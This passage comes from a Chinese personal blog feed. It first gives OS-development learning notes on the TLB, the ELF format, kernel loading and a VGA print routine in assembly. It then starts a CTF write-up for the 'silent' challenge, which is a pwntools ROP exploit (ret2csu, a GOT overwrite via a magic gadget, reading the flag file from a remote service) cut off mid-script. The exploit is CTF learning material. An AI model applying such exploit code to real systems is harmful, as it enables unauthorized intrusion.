title="TLB"></a>TLB</h3><p>在二级页表中，从虚拟地址转换到物理地址需要访问三次内存，那三级、四级页表怎么办？对于<code>CPU</code>来说，访问内存无疑是一种降低效率的行为，所以<code>TLB</code>（Translation Lookaside Buffer，快表）就出现了。</p><p><code>TLB</code> 中的条目是虚拟地址的高 20 位到物理地址高 20 位的映射结果。<code>TLB</code>将近期访问的虚拟地址转换成物理地址后，一一对应储存起来，当<code>CPU</code>下一次需要转换时，会先来<code>TLB</code>中查询，查到就直接拿去用，如果没查到对应的物理地址，会在转换后更新<code>TLB</code>。</p><p>可以使用<code>invlpg</code>指令更新<code>TLB</code></p><h2 id="load-kernel！"><a href="#load-kernel！" class="headerlink" title="load kernel！"></a>load kernel！</h2><p>对于linux kernel，并不采用纯汇编的方式来编写（虽然这8是8行😅），将C和汇编结合起来会更便于理解</p><p>因为我们是在linux操作系统中，kernel的文件格式是elf，所以在loader kernel文件前，我们还需要对elf文件有足够了解</p><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>ELF，Executable and Linkable Format，可执行链接格式。</p><p>ELF文件提供了两种文件视图，链接格式视图和执行格式视图。链接视图是以节（section）为单位，执行视图是以段（segment）为单位。接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。</p><p><img src="/img/OS/25.png" alt="img"></p><p>先来看看elf header</p><h4 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h4><p>ELF header位于文件的开始位置，它的主要目的是定位文件的其他部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_hdr<br>&#123;<br>  unsigned chare_ident[EI_NIDENT];/* Magic number and other info */<br>  Elf32_Halfe_type;/* Object file type */<br>  Elf32_Halfe_machine;/* Architecture */<br>  Elf32_Worde_version;/* Object file version */<br>  Elf32_Addre_entry;/* Entry point virtual address */<br>  Elf32_Offe_phoff;/* Program header table file offset */<br>  Elf32_Offe_shoff;/* Section header table file offset */<br>  Elf32_Worde_flags;               /* Processor-specific flags */<br>  Elf32_Halfe_ehsize;/* ELF header size in bytes */<br>  Elf32_Halfe_phentsize;/* Program header table entry size */<br>  Elf32_Halfe_phnum;/* Program header table entry count */<br>  Elf32_Halfe_shentsize;/* Section header table entry size */<br>  Elf32_Halfe_shnum;/* Section header table entry count */<br>  Elf32_Halfe_shstrndx;/* Section header string table index */<br>&#125; Elf32_Ehdr;<br></code></pre></td></tr></table></figure><p><strong>e_ident：</strong>16字节，含义如下图</p><p><img src="/img/OS/27.png" alt="img"></p><p><strong>e_type：</strong>2字节，文件类型，类型有以下几个</p><p><img src="/img/OS/28.png" alt="img"></p><p><strong>e_machine：</strong>2字节，文件架构，有以下几个架构</p><p><img src="/img/OS/29.png" alt="img"></p><p>用<code>readelf -h</code>即可查看elf header详细信息</p><p><img src="/img/OS/26.png" alt="img"></p><h4 id="Program-header-table"><a href="#Program-header-table" class="headerlink" title="Program header table"></a>Program header table</h4><p>位于elf header之后，程序头表(Program header table)列举了有效的段(segments)和他们的属性（执行视图）</p><p>程序头是一个结构的数组，每一个结构都表示一个段(segments)。在可执行文件或者共享链接库中所有的节(sections)都被分为不同的几个段(segments)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_phdr&#123;<br>  Elf32_Wordp_type;   <br>  Elf32_Off    p_offset;<br>  Elf32_Addrp_vaddr;<br>  Elf32_Addrp_paddr;<br>  Elf32_Wordp_filesz;<br>  Elf32_Wordp_memsz;<br>  Elf32_Wordp_flags;<br>  Elf32_Wordp_align;<br>&#125; Elf32_Phdr;<br></code></pre></td></tr></table></figure><p>程序头的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize)都是通过 ELF头部信息获取的。</p><p><strong>p_type：</strong>指明该段的类型</p><p><img src="/img/OS/30.png" alt="img"></p><p><strong>p_flags：</strong>指明该段的标志</p><p><img src="/img/OS/31.png" alt="img"></p><p>下图画红线的0x20字节便是一个程序头表</p><p><img src="/img/OS/32.png" alt="img"></p><p>当然，也可以使用<code>readelf -l</code>得到详细信息</p><p><img src="/img/OS/33.png" alt="img"></p><p>以上，便是elf文件浅析</p><h3 id="now-lets’s-go"><a href="#now-lets’s-go" class="headerlink" title="now lets’s go!"></a>now lets’s go!</h3><p>先随便写个kernel，内联汇编用起来还是爽的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;stdio.h&gt;<br><br>int main(void)<br>&#123;<br>while(1)<br>&#123;<br>asm(<br>    &quot;mov byte ptr [gs:170], &#x27;W&#x27;;&quot;<br>    &quot;mov byte ptr [gs:172], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:174], &#x27;L&#x27;;&quot;<br>    &quot;mov byte ptr [gs:176], &#x27;C&#x27;;&quot;<br>    &quot;mov byte ptr [gs:178], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:180], &#x27;M&#x27;;&quot;<br>    &quot;mov byte ptr [gs:182], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:184], &#x27; &#x27;;&quot;<br>    &quot;mov byte ptr [gs:186], &#x27;k&#x27;;&quot;<br>    &quot;mov byte ptr [gs:188], &#x27;o&#x27;;&quot;<br>    &quot;mov byte ptr [gs:190], &#x27;r&#x27;;&quot;<br>    &quot;mov byte ptr [gs:192], &#x27;e&#x27;;&quot;<br>    &quot;mov byte ptr [gs:194], &#x27;y&#x27;;&quot;<br>    &quot;mov byte ptr [gs:196], &#x27;&#x27;&#x27;;&quot;<br>    &quot;mov byte ptr [gs:198], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:200], &#x27;S&#x27;;&quot;<br>);<br>&#125;<br>return 0;    <br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要将kernel载入到内存中，完成解析，书中是将kernel载入到0x70000处，解析程序入口到0x1500处，笔者也就照着来了。</p><p>用脚本完成编译链接，0x1500对应的虚拟地址为0xc0001500</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>gcc -m32 -c ./kernel/kernel.c -o ./kernel/kernel.o -masm=intel<br>ld -melf_i386 ./kernel/kernel.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin<br></code></pre></td></tr></table></figure><p>完成载入和解析后，便可以跳到kernel处，load的任务就结束了（我的任务完成啦🤪）</p><p>以下便是代码的变化</p><p><strong>boot.inc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----add-----<br>KERNEL_START_SECTORequ 0x9<br>KERNEL_BIN_BASE_ADDRequ 0x70000<br>KERNEL_ENTRY_POINTequ 0xc0001500<br>PT_NULLequ 0<br></code></pre></td></tr></table></figure><p><strong>pack.sh</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./kernel/kernel.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=200 <span class="hljs-attribute">seek</span>=9 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p><strong>load.s</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;开启保护模式......<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov eax, KERNEL_START_SECTOR<br>mov ebx, KERNEL_BIN_BASE_ADDR<br>mov ecx, 200<br>call rd_disk_m_32                       ;和rd_dsik_m_16一样，寄存器换成32位就行<br><br>call setup_page                         <br><br>sgdt [gdt_ptr]<br>mov ebx, [gdt_ptr + 2]<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS<br>mov cr3, eax<br><br>mov eax, cr0<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]                          ;开启分页<br><br>jmp SELECTOR_CODE:enter_kernel          ;刷新流水线，虽然不刷也莫得关系<br><br>enter_kernel:<br>call kernel_init<br>mov esp, 0xc009f000<br>jmp KERNEL_ENTRY_POINT<br><br><br>;......<br>kernel_init:<br>[bits 32]<br>xor eax, eax<br>xor ebx, ebx<br>xor ecx, ecx<br>xor edx, edx<br><br>mov dx, [KERNEL_BIN_BASE_ADDR + 42]         ;length of program header<br>mov ebx, [KERNEL_BIN_BASE_ADDR + 28]        <br>add ebx, KERNEL_BIN_BASE_ADDR               ;program header table start address<br>mov cx, [KERNEL_BIN_BASE_ADDR+44]           ;count of program header<br><br>.each_segment:<br>cmp byte[ebx + 0],PT_NULL               ;if [ebx+0] == 0,the program header is empty<br>je .PTNULL<br><br>push dword [ebx + 16]                   ;segment size<br>mov eax, [ebx+4]<br>add eax, KERNEL_BIN_BASE_ADDR<br>push eax                                ;src<br>push dword [ebx + 8]                    ;dst<br><br>call mem_cpy<br>add esp, 12                             ;recover<br><br>.PTNULL:<br>add ebx, edx                            ;next program header<br>loop .each_segment<br>ret<br><br>mem_cpy:                                     ;模仿memcpy函数，待我去看看memcpy源码<br>cld<br>push ebp<br>mov ebp, esp<br>push ecx<br><br>mov edi, [ebp+8]<br>mov esi, [ebp+12]<br>mov ecx, [ebp+16]<br>rep movsb                                ;将ds:esi处size为ecx的data，复制到es:edi处，逐字节拷贝<br><br>pop ecx<br>leave                                    ;恢复栈帧<br>ret<br></code></pre></td></tr></table></figure><p>最后的效果的就是这样</p><p><img src="/img/OS/34.png" alt="img"></p><h1 id="0x4-实现自己的输出函数"><a href="#0x4-实现自己的输出函数" class="headerlink" title="0x4:实现自己的输出函数"></a>0x4:实现自己的输出函数</h1><p>在此之前，我们在屏幕上输出，要么是依靠BIOS中断，要么是直接对显存进行操作</p><p>但我们是什么，是尊贵的kernel！输出这件事，应该只要轻轻的call一个function，就能完成</p><p>所以，是时候写一个输出函数了（虽然只是对显存操作测封装罢了🤔）</p><h2 id="单个字符输出"><a href="#单个字符输出" class="headerlink" title="单个字符输出"></a>单个字符输出</h2><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs assembly">TI_GDTequ 0<br>RPL0 equ 0<br>SELECTOR_VIDEOequ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>[bits 32]<br>section .text<br><br>global put_char<br><br>put_char:<br>[bits 32]<br>pushad                                     ;保存寄存器的值<br>mov ax, SELECTOR_VIDEO<br>mov gs, ax<br><br>mov dx, 0x3d4                              ;获取光标的值<br>mov al, 0x0e<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br>mov ah, al<br><br>mov dx, 0x3d4<br>mov al, 0x0f<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br><br>mov bx, ax<br>mov ecx, [esp+36]                           ;将要输出字符的ascii码值给ecx<br><br>cmp cl, 0x0d<br>jz .is_carriage_return<br>cmp cl, 0xa<br>jz .is_line_feed           <br><br>cmp cl, 0x8<br>jz .is_backspace<br>jmp .put_other<br><br>;-----退格-----<br>.is_backspace:<br>[bits 32]<br>dec bx<br>shl bx, 1<br><br>mov byte [gs:bx], 0x20<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>jmp .set_cursor<br><br><br>.put_other:<br>        [bits 32]<br>shl bx, 1<br>mov [gs:bx], cl<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>inc bx<br>cmp bx, 2000<br>jl .set_cursor<br><br>;-----换行-----<br>.is_line_feed:<br>[bits 32]<br>add bx, 80<br>cmp bx, 2000<br>jl .set_cursor<br>;-----回车-----<br>.is_carriage_return:<br>[bits 32]<br>xor dx, dx<br>mov ax, bx<br>mov si, 80<br>div si<br>sub bx, dx<br><br>jmp .set_cursor<br><br>;-----滚屏-----<br>.roll_screen:                                   ;简单来说，就是把1-24的data移动到0-23行，因为我们无需考虑缓存问题<br>[bits 32]                                 <br>cld <br>mov eax, 960                                ;960*4 = 3840<br><br>mov esi, 0xc00b80a0                         ;第1行<br>mov edi, 0xc00b8000                         ;第0行<br>rep movsd                                   ;4字节4字节移动<br><br>mov ebx, 3840                               ;第24行第一个光标的值<br>mov ecx, 80<br><br>.cls:                                       ;使最后一行为空白行<br>[bits 32]<br>mov word [gs:ebx], 0x720<br>add ebx, 2<br>loop .cls<br>mov bx, 1920<br>;-----存储当前光标的值-----<br>.set_cursor:<br>[bits 32]<br>mov dx, 0x3d4<br>mov al,0x0e<br>out dx, al<br>mov dx, 0x03d5<br>mov al, bh<br>out dx, al<br><br>mov dx, 0x3d4<br>mov al, 0xf<br>out dx,al<br>mov dx, 0x03d5<br>mov al, bl<br>out dx, al<br>;-----恢复寄存器状态-----<br>.put_char_done:<br>[bits 32]<br>popad<br>ret<br><br></code></pre></td></tr></table></figure><p>在显存的文本显示模式中，两个字节显示一个字符——一字节为字符的值，一字节为字符的属性。所以获取光标的值*2才是对应字符在显存中的偏移。</p><p>bochs的屏幕，可以容纳80*25共2000个字符，占据4000字节，所以换行就是简单粗暴的光标值+80，回车是当前光标值 - （当前光标值对80取模）。至于滚行的原理，就是简单粗暴的把1-24行移动到0-23行，突出一个不考虑缓存🤪</p><h2 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h2><p>好吧其实就是对单个字符输出的封装呜呜</p><p>print.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdint.h&quot;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_char</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> char_csci)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">put_str</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global put_str<br><br>put_str:<br>push ebx<br>push ecx<br>xor ecx, ecx<br>mov ebx, [esp + 12]<br>.go_on:<br>mov cl, [ebx]<br>cmp cl, 0<br>jz .str_over<br>push ecx<br>call put_char<br>add esp, 4<br>inc ebx<br>jmp .go_on<br><br>.str_over:<br>pop ecx<br>pop ebx<br>ret<br></code></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;print.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>put_str(<span class="hljs-string">&quot;begin\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>);<br>put_str(<span class="hljs-string">&quot;\b\b\b\b\b\b\b\b&quot;</span>);<br>put_str(<span class="hljs-string">&quot;bbbbbbbbbb\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;end\r\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ld.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>nasm -f elf -o ./lib/kernel/print.o ./lib/kernel/print.S<br>gcc -m32 -I lib/kernel/ -c -o ./kernel/main.o ./kernel/main.c -masm=intel<br>ld -melf_i386 ./kernel/main.o ./lib/kernel/print.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin <br></code></pre></td></tr></table></figure><p>运行发现结果还是可以的</p><p><img src="/img/OS/35.png"></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11月比赛合集</title>
    <link href="/2023/11/02/11/"/>
    <url>/2023/11/02/11/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯"><a href="#鹏城杯" class="headerlink" title="鹏城杯"></a>鹏城杯</h1><p>甲级战犯第一场</p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p>用一个magic gadget + ret2csu直接打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;silent&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>ret2csu_front = <span class="hljs-number">0x0000000000400940</span><br>ret2csu_behind = <span class="hljs-number">0x000000000040095A</span><br>magic_gadget = <span class="hljs-number">0x00000000004007e8</span><br>stdout_got = <span class="hljs-number">0x601020</span><br>bss = <span class="hljs-number">0x602000</span><br><br><span class="hljs-comment">#0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_offset</span>(<span class="hljs-params">target,raw</span>):<br>    offset = target - raw<br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        offset = offset + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_vuln</span>(<span class="hljs-params">offset,target</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        offset,<br>        target+<span class="hljs-number">0x3d</span>,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>        magic_gadget,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rdi,rsi,rdx,vuln</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>        vuln,<br>        rdi,rsi,rdx,<br>        ret2csu_front,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + ret2csu(<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x300</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x400878</span>)<br><br>sd(payload1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(bss,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload2 += set_vuln(set_offset(libc.sym[<span 